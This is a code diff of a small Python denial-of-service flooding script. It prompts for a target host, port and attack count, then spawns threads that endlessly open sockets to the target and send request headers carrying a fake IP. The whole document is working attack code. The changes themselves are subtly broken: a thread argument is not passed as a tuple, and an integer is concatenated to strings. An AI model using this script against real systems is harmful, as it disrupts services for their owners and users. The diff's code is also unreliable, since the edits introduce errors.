@@ -7,7 +7,7 @@ port = int(input("Target Port: "))
 attack_count = int(input("Amount of attacks: "))
 
 
-def attack():
+def attack(count):
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,11 +17,11 @@ def attack():
             s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
                      (target, port))
             s.close()
-            print("Sucessfull")
+            print("Successfull: " + count)
         except ConnectionRefusedError:
-            print("Server Error")
+            print("Server Error: " + count)
 
 
 for i in range(attack_count):
-    thread = threading.Thread(target=attack)
+    thread = threading.Thread(target=attack, args=i)
     thread.start()
